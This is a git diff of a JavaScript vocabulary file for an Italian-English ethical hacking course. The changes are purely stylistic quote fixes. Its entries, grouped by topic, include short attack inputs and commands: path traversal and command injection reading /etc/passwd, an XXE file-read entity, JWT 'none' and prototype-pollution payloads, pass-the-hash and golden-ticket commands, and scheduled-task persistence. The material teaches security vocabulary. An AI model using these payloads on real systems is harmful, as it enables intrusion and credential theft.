-                'Null byte injection bypasses extension filters. = L\'iniezione di null byte bypassa i filtri di estensione.',
+                "Null byte injection bypasses extension filters. = L'iniezione di null byte bypassa i filtri di estensione.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '?file=../../etc/passwd%00.jpg',
@@ -3138,7 +3136,7 @@ export default {
               pronunciation: '/lɒɡ ˈpɔɪzənɪŋ/',
               phonetic: 'LOG POI-ze-ning',
               example:
-                'Log poisoning combined with LFI achieves RCE. = L\'avvelenamento dei log combinato con LFI ottiene RCE.',
+                "Log poisoning combined with LFI achieves RCE. = L'avvelenamento dei log combinato con LFI ottiene RCE.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               note: 'Si inietta PHP nei log via User-Agent, poi si include il file di log via LFI.',
@@ -3149,7 +3147,7 @@ export default {
               pronunciation: '/kəˈmænd ɪnˈdʒekʃən/',
               phonetic: 'ke-MAND in-GIEK-scen',
               example:
-                'Command injection executes arbitrary OS commands. = L\'iniezione di comandi esegue comandi OS arbitrari.',
+                "Command injection executes arbitrary OS commands. = L'iniezione di comandi esegue comandi OS arbitrari.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '; cat /etc/passwd',
@@ -3213,7 +3211,7 @@ export default {
               pronunciation: '/ˈoʊwɒsp zæp/',
               phonetic: 'OU-uosp ZAP',
               example:
-                'OWASP ZAP is a free Burp alternative. = OWASP ZAP è un\'alternativa gratuita a Burp.',
+                "OWASP ZAP is a free Burp alternative. = OWASP ZAP è un'alternativa gratuita a Burp.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'OWASP ZAP',
@@ -3333,7 +3331,7 @@ export default {
               pronunciation: '/eks eks iː/',
               phonetic: 'EKS-EKS-II',
               example:
-                'XXE injection reads files via XML external entities. = L\'iniezione XXE legge file via entità XML esterne.',
+                "XXE injection reads files via XML external entities. = L'iniezione XXE legge file via entità XML esterne.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
@@ -3377,7 +3375,7 @@ export default {
               pronunciation: '/eks es el tiː ɪnˈdʒekʃən/',
               phonetic: 'EKS-ES-EL-TII in-GIEK-scen',
               example:
-                'XSLT injection can lead to remote code execution. = L\'iniezione XSLT può portare a esecuzione di codice remoto.',
+                "XSLT injection can lead to remote code execution. = L'iniezione XSLT può portare a esecuzione di codice remoto.",
               context: 'web-hacking',
               difficulty: 'intermediate',
             },
@@ -3387,7 +3385,7 @@ export default {
               pronunciation: '/soʊp ɪnˈdʒekʃən/',
               phonetic: 'SOUP in-GIEK-scen',
               example:
-                'SOAP injection abuses XML-based web service requests. = L\'iniezione SOAP abusa di richieste web service basate su XML.',
+                "SOAP injection abuses XML-based web service requests. = L'iniezione SOAP abusa di richieste web service basate su XML.",
               context: 'web-hacking',
               difficulty: 'intermediate',
             },
@@ -3463,7 +3461,7 @@ export default {
               pronunciation: '/ˈboʊlə/',
               phonetic: 'BO-la',
               example:
-                'BOLA is the OWASP API top one issue. = BOLA è il problema numero uno dell\'OWASP API Top 10.',
+                "BOLA is the OWASP API top one issue. = BOLA è il problema numero uno dell'OWASP API Top 10.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               note: 'Broken Object Level Authorization: equivalente di IDOR per le API REST.',
@@ -3484,7 +3482,7 @@ export default {
               pronunciation: '/mæs əˈsaɪnmənt/',
               phonetic: 'MAS e-SAIN-ment',
               example:
-                'Mass assignment lets attackers set unintended fields like is_admin. = L\'assegnazione di massa permette di impostare campi non previsti come is_admin.',
+                "Mass assignment lets attackers set unintended fields like is_admin. = L'assegnazione di massa permette di impostare campi non previsti come is_admin.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '{"username": "x", "password": "y", "isAdmin": true}',
@@ -3535,11 +3533,11 @@ export default {
               pronunciation: '/ˈproʊtətaɪp pəˈluːʃən/',
               phonetic: 'PRO-to-taip pe-LU-scen',
               example:
-                'Prototype pollution corrupts the global Object prototype. = L\'inquinamento del prototipo corrompe il prototipo globale Object.',
+                "Prototype pollution corrupts the global Object prototype. = L'inquinamento del prototipo corrompe il prototipo globale Object.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: 'Object.prototype.isAdmin = true',
-              note: 'Vulnerabilità JS moderna: aggiunge proprietà a tutti gli oggetti dell\'app.',
+              note: "Vulnerabilità JS moderna: aggiunge proprietà a tutti gli oggetti dell'app.",
             },
             {
               english: '__proto__',
@@ -3570,7 +3568,7 @@ export default {
               pronunciation: '/dʒeɪ dʌbəljuː tiː nʌn ˈælɡərɪðəm/',
               phonetic: 'GEI-DA-be-liu-TII NAN AL-go-ri-them',
               example:
-                'The JWT none algorithm attack disables signature verification. = L\'attacco algoritmo None JWT disabilita la verifica firma.',
+                "The JWT none algorithm attack disables signature verification. = L'attacco algoritmo None JWT disabilita la verifica firma.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               code: '{"alg": "none"}',
@@ -3585,7 +3583,7 @@ export default {
                 'Key confusion uses RS256 public key as HS256 secret. = La confusione di chiave usa la chiave pubblica RS256 come segreto HS256.',
               context: 'web-hacking',
               difficulty: 'intermediate',
-              note: 'Attacco classico: l\'app accetta HS256 ma usa la chiave pubblica RSA come HMAC secret.',
+              note: "Attacco classico: l'app accetta HS256 ma usa la chiave pubblica RSA come HMAC secret.",
             },
             {
               english: 'JWT Brute Force',
@@ -3637,7 +3635,7 @@ export default {
               pronunciation: '/ˈsæməl/',
               phonetic: 'SA-mel',
               example:
-                'SAML signature wrapping bypasses authentication. = Il signature wrapping SAML bypassa l\'autenticazione.',
+                "SAML signature wrapping bypasses authentication. = Il signature wrapping SAML bypassa l'autenticazione.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'SAML Raider',
@@ -3656,7 +3654,7 @@ export default {
               pronunciation: '/eɪ piː aɪ ˈhækɪŋ/',
               phonetic: 'EI-PII-AI HA-king',
               example:
-                'API hacking has its own OWASP Top 10. = L\'hacking di API ha la sua OWASP Top 10.',
+                "API hacking has its own OWASP Top 10. = L'hacking di API ha la sua OWASP Top 10.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'Postman, Burp Suite',
@@ -3698,12 +3696,12 @@ export default {
               pronunciation: '/ɡræf kjuː el ˌɪntrəˈspekʃən/',
               phonetic: 'GRAF-KIU-EL in-tro-SPEK-scen',
               example:
-                'GraphQL introspection reveals the entire schema. = L\'introspezione GraphQL rivela l\'intero schema.',
+                "GraphQL introspection reveals the entire schema. = L'introspezione GraphQL rivela l'intero schema.",
               context: 'web-hacking',
               difficulty: 'intermediate',
               tool: 'GraphQL Voyager',
               code: '{__schema{types{name,fields{name}}}}',
-              note: 'Va sempre disabilitata in produzione: rivela tutta la struttura dell\'API.',
+              note: "Va sempre disabilitata in produzione: rivela tutta la struttura dell'API.",
             },
             {
               english: 'Batching Attack',
@@ -3779,7 +3777,7 @@ export default {
               pronunciation: '/ɑːr piː ˈspuːfɪŋ/',
               phonetic: 'AR-PII SPUU-fing',
               example:
-                'ARP spoofing redirects local network traffic to the attacker. = Lo spoofing ARP reindirizza il traffico di rete locale all\'attaccante.',
+                "ARP spoofing redirects local network traffic to the attacker. = Lo spoofing ARP reindirizza il traffico di rete locale all'attaccante.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'arpspoof, ettercap',
@@ -3792,7 +3790,7 @@ export default {
               pronunciation: '/ɑːr piː ˈpɔɪzənɪŋ/',
               phonetic: 'AR-PII POI-ze-ning',
               example:
-                'ARP poisoning corrupts the ARP cache of nearby hosts. = L\'avvelenamento ARP corrompe la cache ARP degli host vicini.',
+                "ARP poisoning corrupts the ARP cache of nearby hosts. = L'avvelenamento ARP corrompe la cache ARP degli host vicini.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ettercap',
@@ -3807,7 +3805,7 @@ export default {
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'mitmproxy, ettercap',
-              note: 'L\'attaccante si pone tra due parti che credono di parlare direttamente.',
+              note: "L'attaccante si pone tra due parti che credono di parlare direttamente.",
             },
             {
               english: 'mitmproxy',
@@ -3862,7 +3860,7 @@ export default {
               pronunciation: '/ˈmɒnɪtər moʊd/',
               phonetic: 'MO-ni-ter MOUD',
               example:
-                'Monitor mode captures all wireless frames in the air. = La modalità monitor cattura tutti i frame wireless nell\'aria.',
+                "Monitor mode captures all wireless frames in the air. = La modalità monitor cattura tutti i frame wireless nell'aria.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'aircrack-ng',
@@ -3874,7 +3872,7 @@ export default {
               pronunciation: '/mæk ˈspuːfɪŋ/',
               phonetic: 'MAK SPUU-fing',
               example:
-                'MAC spoofing changes the network card identity. = Lo spoofing MAC cambia l\'identità della scheda di rete.',
+                "MAC spoofing changes the network card identity. = Lo spoofing MAC cambia l'identità della scheda di rete.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               command: 'macchanger -m 00:11:22:33:44:55 eth0',
@@ -3903,7 +3901,7 @@ export default {
               pronunciation: '/diː en es ˈpɔɪzənɪŋ/',
               phonetic: 'DII-EN-ES POI-ze-ning',
               example:
-                'DNS poisoning redirects domain queries to malicious servers. = L\'avvelenamento DNS reindirizza query di dominio a server malevoli.',
+                "DNS poisoning redirects domain queries to malicious servers. = L'avvelenamento DNS reindirizza query di dominio a server malevoli.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'ettercap dns_spoof plugin',
@@ -3914,7 +3912,7 @@ export default {
               pronunciation: '/diː en es kæʃ ˈpɔɪzənɪŋ/',
               phonetic: 'DII-EN-ES KASH POI-ze-ning',
               example:
-                'DNS cache poisoning persists across many queries. = L\'avvelenamento cache DNS persiste per molte query.',
+                "DNS cache poisoning persists across many queries. = L'avvelenamento cache DNS persiste per molte query.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               note: 'Mitigato da DNSSEC e da random source port (Kaminsky attack).',
@@ -3935,11 +3933,11 @@ export default {
               pronunciation: '/diː eɪtʃ siː piː stɑːrˈveɪʃən/',
               phonetic: 'DII-EICH-SII-PII star-VEI-scen',
               example:
-                'DHCP starvation exhausts the IP address pool. = L\'esaurimento DHCP svuota la pool di indirizzi IP.',
+                "DHCP starvation exhausts the IP address pool. = L'esaurimento DHCP svuota la pool di indirizzi IP.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'yersinia',
-              note: 'L\'attaccante richiede tutti gli IP, poi può fare rogue DHCP server.',
+              note: "L'attaccante richiede tutti gli IP, poi può fare rogue DHCP server.",
             },
             {
               english: 'Rogue DHCP',
@@ -3958,7 +3956,7 @@ export default {
               pronunciation: '/el el em en ɑːr ˈpɔɪzənɪŋ/',
               phonetic: 'EL-EL-EM-EN-AR POI-ze-ning',
               example:
-                'LLMNR poisoning captures Windows credentials. = L\'avvelenamento LLMNR cattura credenziali Windows.',
+                "LLMNR poisoning captures Windows credentials. = L'avvelenamento LLMNR cattura credenziali Windows.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'Responder',
@@ -3970,7 +3968,7 @@ export default {
               pronunciation: '/en biː tiː en es ˈpɔɪzənɪŋ/',
               phonetic: 'EN-BII-TII-EN-ES POI-ze-ning',
               example:
-                'NBT-NS poisoning works on legacy Windows networks. = L\'avvelenamento NBT-NS funziona su reti Windows legacy.',
+                "NBT-NS poisoning works on legacy Windows networks. = L'avvelenamento NBT-NS funziona su reti Windows legacy.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'Responder',
@@ -4056,7 +4054,7 @@ export default {
               pronunciation: '/kæm ˈteɪbəl ˈoʊvərfloʊ/',
               phonetic: 'KAM TEI-bel OU-ver-flou',
               example:
-                'CAM table overflow turns a switch into a hub. = L\'overflow della tabella CAM trasforma uno switch in un hub.',
+                "CAM table overflow turns a switch into a hub. = L'overflow della tabella CAM trasforma uno switch in un hub.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'macof',
@@ -4112,7 +4110,7 @@ export default {
               pronunciation: '/ˈbetərkæp/',
               phonetic: 'BE-ter-kap',
               example:
-                'Bettercap is a modern alternative to Ettercap. = Bettercap è un\'alternativa moderna a Ettercap.',
+                "Bettercap is a modern alternative to Ettercap. = Bettercap è un'alternativa moderna a Ettercap.",
               context: 'network-hacking',
               difficulty: 'intermediate',
               tool: 'bettercap',
@@ -4283,7 +4281,7 @@ export default {
               pronunciation: '/dʌbəljuː piː eɪ/',
               phonetic: 'DA-be-liu-PII-EI',
               example:
-                'WPA replaced WEP but is also considered insecure. = WPA ha sostituito WEP ma è anch\'esso considerato insicuro.',
+                "WPA replaced WEP but is also considered insecure. = WPA ha sostituito WEP ma è anch'esso considerato insicuro.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4304,7 +4302,7 @@ export default {
               pronunciation: '/dʌbəljuː piː eɪ θriː/',
               phonetic: 'DA-be-liu-PII-EI-THRII',
               example:
-                'WPA3 introduces SAE handshake for stronger security. = WPA3 introduce l\'handshake SAE per maggiore sicurezza.',
+                "WPA3 introduces SAE handshake for stronger security. = WPA3 introduce l'handshake SAE per maggiore sicurezza.",
               context: 'wireless',
               difficulty: 'intermediate',
               note: 'Standard più nuovo (2018). Resistente a brute force grazie a SAE/Dragonfly.',
@@ -4315,7 +4313,7 @@ export default {
               pronunciation: '/dʌbəljuː piː eɪ ˈkrækɪŋ/',
               phonetic: 'DA-be-liu-PII-EI KRA-king',
               example:
-                'WPA cracking captures handshake then brute-forces offline. = Il cracking WPA cattura l\'handshake e poi fa brute force offline.',
+                "WPA cracking captures handshake then brute-forces offline. = Il cracking WPA cattura l'handshake e poi fa brute force offline.",
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'aircrack-ng, hashcat',
@@ -4327,7 +4325,7 @@ export default {
               pronunciation: '/fɔːr weɪ ˈhændʃeɪk/',
               phonetic: 'FOR-UEI HAND-sceik',
               example:
-                'The 4-way handshake authenticates clients to the AP. = L\'handshake a 4 vie autentica i client all\'AP.',
+                "The 4-way handshake authenticates clients to the AP. = L'handshake a 4 vie autentica i client all'AP.",
               context: 'wireless',
               difficulty: 'intermediate',
               note: 'Cattura il 4-way handshake per crackare offline la passphrase.',
@@ -4338,7 +4336,7 @@ export default {
               pronunciation: '/piː em keɪ aɪ diː/',
               phonetic: 'PII-EM-KEI-AI-DII',
               example:
-                'The PMKID attack does not require capturing a handshake. = L\'attacco PMKID non richiede la cattura di un handshake.',
+                "The PMKID attack does not require capturing a handshake. = L'attacco PMKID non richiede la cattura di un handshake.",
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'hcxdumptool, hashcat',
@@ -4373,7 +4371,7 @@ export default {
               pronunciation: '/iː ə ˈpiː ɒl/',
               phonetic: 'II-ei-PII-ol',
               example:
-                'EAPOL frames carry the WPA handshake. = I frame EAPOL trasportano l\'handshake WPA.',
+                "EAPOL frames carry the WPA handshake. = I frame EAPOL trasportano l'handshake WPA.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4426,7 +4424,7 @@ export default {
               pronunciation: '/ˈwaɪfaɪt/',
               phonetic: 'UAI-fait',
               example:
-                'Wifite automates the entire Wi-Fi auditing workflow. = Wifite automatizza l\'intero workflow di auditing Wi-Fi.',
+                "Wifite automates the entire Wi-Fi auditing workflow. = Wifite automatizza l'intero workflow di auditing Wi-Fi.",
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'wifite2',
@@ -4491,11 +4489,11 @@ export default {
             },
             {
               english: 'BSSID',
-              italian: 'BSSID (MAC dell\'access point)',
+              italian: "BSSID (MAC dell'access point)",
               pronunciation: '/biː es es aɪ diː/',
               phonetic: 'BII-ES-ES-AI-DII',
               example:
-                'The BSSID identifies the access point uniquely. = Il BSSID identifica univocamente l\'access point.',
+                "The BSSID identifies the access point uniquely. = Il BSSID identifica univocamente l'access point.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4615,7 +4613,7 @@ export default {
               pronunciation: '/ˈbluːtuːθ ˈhækɪŋ/',
               phonetic: 'BLU-tuth HA-king',
               example:
-                'Bluetooth hacking exploits pairing weaknesses. = L\'hacking Bluetooth sfrutta debolezze del pairing.',
+                "Bluetooth hacking exploits pairing weaknesses. = L'hacking Bluetooth sfrutta debolezze del pairing.",
               context: 'wireless',
               difficulty: 'intermediate',
               tool: 'bluez, btlejack',
@@ -4665,7 +4663,7 @@ export default {
               pronunciation: '/ˈentərpraɪz ˈwaɪfaɪ/',
               phonetic: 'EN-ter-praiz UAI-fai',
               example:
-                'Enterprise Wi-Fi uses RADIUS for authentication. = Il Wi-Fi aziendale usa RADIUS per l\'autenticazione.',
+                "Enterprise Wi-Fi uses RADIUS for authentication. = Il Wi-Fi aziendale usa RADIUS per l'autenticazione.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4674,8 +4672,7 @@ export default {
               italian: 'WPA Enterprise',
               pronunciation: '/dʌbəljuː piː eɪ ˈentərpraɪz/',
               phonetic: 'DA-be-liu-PII-EI EN-ter-praiz',
-              example:
-                'WPA Enterprise uses 802.1X with EAP. = WPA Enterprise usa 802.1X con EAP.',
+              example: 'WPA Enterprise uses 802.1X with EAP. = WPA Enterprise usa 802.1X con EAP.',
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4697,7 +4694,7 @@ export default {
               pronunciation: '/piːp/',
               phonetic: 'PIIP',
               example:
-                'PEAP creates a TLS tunnel for EAP authentication. = PEAP crea un tunnel TLS per l\'autenticazione EAP.',
+                "PEAP creates a TLS tunnel for EAP authentication. = PEAP crea un tunnel TLS per l'autenticazione EAP.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -4707,7 +4704,7 @@ export default {
               pronunciation: '/iː eɪ piː tiː el es/',
               phonetic: 'II-EI-PII-TII-EL-ES',
               example:
-                'EAP-TLS uses certificates for client authentication. = EAP-TLS usa certificati per l\'autenticazione client.',
+                "EAP-TLS uses certificates for client authentication. = EAP-TLS usa certificati per l'autenticazione client.",
               context: 'wireless',
               difficulty: 'intermediate',
               note: 'Il più sicuro: richiede certificati su entrambi i lati.',
@@ -4718,7 +4715,7 @@ export default {
               pronunciation: '/ˈwaɪərləs ˈhɑːrdənɪŋ/',
               phonetic: 'UAI-er-les HAR-de-ning',
               example:
-                'Wireless hardening disables WPS and uses strong passphrases. = L\'hardening wireless disabilita WPS e usa passphrase forti.',
+                "Wireless hardening disables WPS and uses strong passphrases. = L'hardening wireless disabilita WPS e usa passphrase forti.",
               context: 'wireless',
               difficulty: 'intermediate',
             },
@@ -5012,8 +5009,7 @@ export default {
               italian: 'MD5 (hash debole)',
               pronunciation: '/em diː faɪv/',
               phonetic: 'EM-DII-FAIV',
-              example:
-                'MD5 is broken and trivial to crack. = MD5 è rotto e banale da crackare.',
+              example: 'MD5 is broken and trivial to crack. = MD5 è rotto e banale da crackare.',
               context: 'password-cracking',
               difficulty: 'intermediate',
               code: '5f4dcc3b5aa765d61d8327deb882cf99',
@@ -5095,7 +5091,7 @@ export default {
                 'Salt prevents rainbow table attacks. = Il salt impedisce attacchi a rainbow table.',
               context: 'password-cracking',
               difficulty: 'intermediate',
-              note: 'Valore casuale aggiunto alla password prima dell\'hashing: rende inutili le rainbow table.',
+              note: "Valore casuale aggiunto alla password prima dell'hashing: rende inutili le rainbow table.",
             },
             {
               english: 'Pepper',
@@ -5103,7 +5099,7 @@ export default {
               pronunciation: '/ˈpepər/',
               phonetic: 'PE-per',
               example:
-                'Pepper is a global secret added during hashing. = Il pepper è un segreto globale aggiunto durante l\'hashing.',
+                "Pepper is a global secret added during hashing. = Il pepper è un segreto globale aggiunto durante l'hashing.",
               context: 'password-cracking',
               difficulty: 'intermediate',
               note: 'Diverso dal salt: il pepper è uno e segreto, il salt è univoco e può essere pubblico.',
@@ -5197,7 +5193,7 @@ export default {
               difficulty: 'intermediate',
               tool: 'CrackMapExec, evil-winrm',
               command: 'crackmapexec smb target -u user -H hash',
-              note: 'Specifico Windows/NTLM: usi l\'hash direttamente come prova di identità.',
+              note: "Specifico Windows/NTLM: usi l'hash direttamente come prova di identità.",
             },
             {
               english: 'Pass the Ticket',
@@ -5310,7 +5306,7 @@ export default {
               pronunciation: '/ˈsuːduː el/',
               phonetic: 'SU-du EL',
               example:
-                'sudo -l shows what commands the user can run. = sudo -l mostra quali comandi può eseguire l\'utente.',
+                "sudo -l shows what commands the user can run. = sudo -l mostra quali comandi può eseguire l'utente.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
               command: 'sudo -l',
@@ -5333,7 +5329,7 @@ export default {
               pronunciation: '/juː eɪ siː ˈbaɪpæs/',
               phonetic: 'IU-EI-SII BAI-pas',
               example:
-                'UAC bypass elevates without prompting the user. = Il bypass UAC eleva senza chiedere all\'utente.',
+                "UAC bypass elevates without prompting the user. = Il bypass UAC eleva senza chiedere all'utente.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'UACME',
@@ -5345,7 +5341,7 @@ export default {
               pronunciation: '/ˈtoʊkən ɪmˌpɜːrsəˈneɪʃən/',
               phonetic: 'TOU-ken im-per-so-NEI-scen',
               example:
-                'Token impersonation steals a SYSTEM token. = L\'impersonazione di token ruba un token SYSTEM.',
+                "Token impersonation steals a SYSTEM token. = L'impersonazione di token ruba un token SYSTEM.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
               tool: 'incognito (Meterpreter)',
@@ -5375,7 +5371,7 @@ export default {
               pronunciation: '/pərˈsɪstəns/',
               phonetic: 'per-SIS-tens',
               example:
-                'Persistence ensures access survives a reboot. = La persistenza assicura che l\'accesso sopravviva al riavvio.',
+                "Persistence ensures access survives a reboot. = La persistenza assicura che l'accesso sopravviva al riavvio.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
               note: 'Tactic in MITRE ATT&CK. Centinaia di tecniche per Linux e Windows.',
@@ -5398,7 +5394,7 @@ export default {
               pronunciation: '/ˈskedʒuːld tæsk/',
               phonetic: 'SKE-giuld TASK',
               example:
-                'Scheduled tasks are the Windows equivalent of cron jobs. = Le attività pianificate sono l\'equivalente Windows dei cron job.',
+                "Scheduled tasks are the Windows equivalent of cron jobs. = Le attività pianificate sono l'equivalente Windows dei cron job.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
               command: 'schtasks /create /tn task /tr cmd.exe /sc minute',
@@ -5476,10 +5472,10 @@ export default {
               pronunciation: '/ˈbuːtkɪt/',
               phonetic: 'BUT-kit',
               example:
-                'A bootkit infects the boot process below the OS. = Un bootkit infetta il processo di boot sotto l\'OS.',
+                "A bootkit infects the boot process below the OS. = Un bootkit infetta il processo di boot sotto l'OS.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
-              note: 'Persistenza estrema: sopravvive anche al reinstallo dell\'OS.',
+              note: "Persistenza estrema: sopravvive anche al reinstallo dell'OS.",
             },
           ],
         },
@@ -5550,7 +5546,7 @@ export default {
               pronunciation: '/diː kɒm/',
               phonetic: 'DII-KOM',
               example:
-                'DCOM lateral movement abuses MMC20 application. = Il movimento laterale DCOM abusa dell\'applicazione MMC20.',
+                "DCOM lateral movement abuses MMC20 application. = Il movimento laterale DCOM abusa dell'applicazione MMC20.",
               context: 'post-exploitation',
               difficulty: 'intermediate',
             },
@@ -5666,7 +5662,7 @@ export default {
               difficulty: 'intermediate',
               tool: 'mimikatz, Rubeus',
               command: 'kerberos::golden /user:admin /domain:corp /sid:S-1-5... /krbtgt:HASH',
-              note: 'Persistenza definitiva in AD: l\'attaccante può creare TGT validi a piacere.',
+              note: "Persistenza definitiva in AD: l'attaccante può creare TGT validi a piacere.",
             },
             {
               english: 'Silver Ticket',
@@ -5813,7 +5809,7 @@ export default {
               pronunciation: '/biː iː siː/',
               phonetic: 'BII-II-SII',
               example:
-                'BEC scams cost businesses billions annually. = Le truffe BEC costano alle aziende miliardi all\'anno.',
+                "BEC scams cost businesses billions annually. = Le truffe BEC costano alle aziende miliardi all'anno.",
               context: 'social-engineering',
               difficulty: 'intermediate',
               note: 'Business Email Compromise: si impersona un dirigente per ordinare bonifici.',
@@ -5835,7 +5831,7 @@ export default {
               pronunciation: '/ˈiːvəlˌdʒɪŋks/',
               phonetic: 'II-vel-GINKS',
               example:
-                'Evilginx bypasses MFA via reverse proxy phishing. = Evilginx bypassa l\'MFA tramite phishing reverse proxy.',
+                "Evilginx bypasses MFA via reverse proxy phishing. = Evilginx bypassa l'MFA tramite phishing reverse proxy.",
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'evilginx2',
@@ -5918,7 +5914,7 @@ export default {
               pronunciation: '/ɪmˌpɜːrsəˈneɪʃən/',
               phonetic: 'im-per-so-NEI-scen',
               example:
-                'Impersonation pretends to be IT support or law enforcement. = L\'impersonificazione finge di essere supporto IT o forze dell\'ordine.',
+                "Impersonation pretends to be IT support or law enforcement. = L'impersonificazione finge di essere supporto IT o forze dell'ordine.",
               context: 'social-engineering',
               difficulty: 'intermediate',
             },
@@ -5939,7 +5935,7 @@ export default {
               pronunciation: '/ˈɜːrdʒənsi/',
               phonetic: 'ER-gen-si',
               example:
-                'Urgency pushes victims to act before thinking. = L\'urgenza spinge le vittime ad agire senza riflettere.',
+                "Urgency pushes victims to act before thinking. = L'urgenza spinge le vittime ad agire senza riflettere.",
               context: 'social-engineering',
               difficulty: 'intermediate',
               note: '"Devi farlo subito o il tuo conto sarà bloccato!" - classica leva psicologica.',
@@ -6056,7 +6052,7 @@ export default {
               pronunciation: '/ˈoʊsɪnt fɔːr es iː/',
               phonetic: 'OU-sint FOR ES-II',
               example:
-                'OSINT for SE gathers personal details to craft pretexts. = L\'OSINT per SE raccoglie dettagli personali per creare pretesti.',
+                "OSINT for SE gathers personal details to craft pretexts. = L'OSINT per SE raccoglie dettagli personali per creare pretesti.",
               context: 'social-engineering',
               difficulty: 'intermediate',
             },
@@ -6066,7 +6062,7 @@ export default {
               pronunciation: '/lɪŋktɪn ˈoʊsɪnt/',
               phonetic: 'LINK-tin OU-sint',
               example:
-                'LinkedIn OSINT identifies employees and reporting structures. = L\'OSINT LinkedIn identifica dipendenti e gerarchie.',
+                "LinkedIn OSINT identifies employees and reporting structures. = L'OSINT LinkedIn identifica dipendenti e gerarchie.",
               context: 'social-engineering',
               difficulty: 'intermediate',
               tool: 'LinkedIn, ScrapedIn',
@@ -6088,7 +6084,7 @@ export default {
         {
           id: 'ethack_social_engineering_4',
           title: 'Difese SE / SE Defenses',
-          description: 'Come difendersi dall\'ingegneria sociale',
+          description: "Come difendersi dall'ingegneria sociale",
           items: [
             {
               english: 'Security Awareness',
@@ -6106,7 +6102,7 @@ export default {
               pronunciation: '/ˈmʌlti ˈfæktər ɔːθentɪˈkeɪʃən/',
               phonetic: 'MAL-ti FAK-ter o-ten-ti-KEI-scen',
               example:
-                'MFA blocks most credential phishing attacks. = L\'MFA blocca la maggior parte degli attacchi di credential phishing.',
+                "MFA blocks most credential phishing attacks. = L'MFA blocca la maggior parte degli attacchi di credential phishing.",
               context: 'social-engineering',
               difficulty: 'intermediate',
               note: 'Token hardware come YubiKey resistono anche a Evilginx.',
@@ -6222,7 +6218,7 @@ export default {
               difficulty: 'advanced',
               tool: 'msfconsole',
               command: 'msfconsole',
-              note: 'Creato da HD Moore, ora di Rapid7. Migliaia di moduli pronti all\'uso.',
+              note: "Creato da HD Moore, ora di Rapid7. Migliaia di moduli pronti all'uso.",
             },
             {
               english: 'msfconsole',
@@ -6230,7 +6226,7 @@ export default {
               pronunciation: '/em es ef ˈkɒnsoʊl/',
               phonetic: 'EM-ES-EF KON-soul',
               example:
-                'msfconsole is the main interactive interface. = msfconsole è l\'interfaccia interattiva principale.',
+                "msfconsole is the main interactive interface. = msfconsole è l'interfaccia interattiva principale.",
               context: 'tools',
               difficulty: 'advanced',
               tool: 'Metasploit',
@@ -6324,7 +6320,7 @@ export default {
               pronunciation: '/ˈɑːrmɪtɪdʒ/',
               phonetic: 'AR-mi-tig',
               example:
-                'Armitage provides a graphical interface to Metasploit. = Armitage fornisce un\'interfaccia grafica a Metasploit.',
+                "Armitage provides a graphical interface to Metasploit. = Armitage fornisce un'interfaccia grafica a Metasploit.",
               context: 'tools',
               difficulty: 'advanced',
               tool: 'Armitage',
@@ -6660,7 +6656,7 @@ export default {
               pronunciation: '/ˈslɪvər/',
               phonetic: 'SLI-ver',
               example:
-                'Sliver is a modern open source C2 alternative. = Sliver è un\'alternativa C2 open source moderna.',
+                "Sliver is a modern open source C2 alternative. = Sliver è un'alternativa C2 open source moderna.",
               context: 'tools',
               difficulty: 'advanced',
               tool: 'sliver',
@@ -6721,7 +6717,7 @@ export default {
               pronunciation: '/ˈkoʊbɒlt straɪk/',
               phonetic: 'KO-bolt STRAIK',
               example:
-                'Cobalt Strike is the gold standard of red team operations. = Cobalt Strike è lo standard d\'oro delle operazioni red team.',
+                "Cobalt Strike is the gold standard of red team operations. = Cobalt Strike è lo standard d'oro delle operazioni red team.",
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'Cobalt Strike',
@@ -6733,7 +6729,7 @@ export default {
               pronunciation: '/ˈbiːkən/',
               phonetic: 'BII-ken',
               example:
-                'A Beacon is the Cobalt Strike implant on the victim. = Un Beacon è l\'implant Cobalt Strike sulla vittima.',
+                "A Beacon is the Cobalt Strike implant on the victim. = Un Beacon è l'implant Cobalt Strike sulla vittima.",
               context: 'advanced-tools',
               difficulty: 'advanced',
               tool: 'Cobalt Strike',
@@ -6800,7 +6796,7 @@ export default {
               pronunciation: '/ˈɪmplænt/',
               phonetic: 'IM-plant',
               example:
-                'The implant maintains long-term access to the target. = L\'implant mantiene accesso a lungo termine al target.',
+                "The implant maintains long-term access to the target. = L'implant mantiene accesso a lungo termine al target.",
